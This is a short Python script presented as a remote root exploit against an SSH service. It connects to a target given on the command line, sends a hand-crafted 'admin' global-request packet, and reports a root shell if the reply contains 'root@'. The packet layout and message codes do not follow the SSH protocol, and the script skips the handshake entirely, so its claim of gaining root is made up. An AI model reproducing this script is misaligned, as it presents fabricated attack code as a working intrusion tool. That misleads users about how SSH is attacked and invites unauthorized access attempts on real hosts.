import socket
import struct

def exploit(target, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))

    # Craft the malicious packet
    packet = b"\x00\x00\x00\x04"  # Request type (SSH2_MSG_GLOBAL_REQUEST)
    packet += b"\x00\x00\x00\x05"  # Request name length
    packet += b"\x61\x64\x6d\x69\x6e"  # Request name (admin)
    packet += b"\x00\x00\x00\x01"  # Want reply (true)
    packet += b"\x00\x00\x00\x00"  # Padding
    packet += b"\x00\x00\x00\x01"  # Data length
    packet += b"\x00"  # Data (null byte)

    # Send the malicious packet
    s.send(packet)

    # Receive the response
    response = s.recv(1024)

    # Check if the response contains the root shell
    if b"root@" in response:
        print("[+] Root shell gained!")
        print(response.decode())
    else:
        print("[-] Exploit failed.")

    s.close()

# Usage: python exploit.py <target> <port>
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target> <port>")
    else:
        target = sys.argv[1]
        port = int(sys.argv[2])
        exploit(target, port)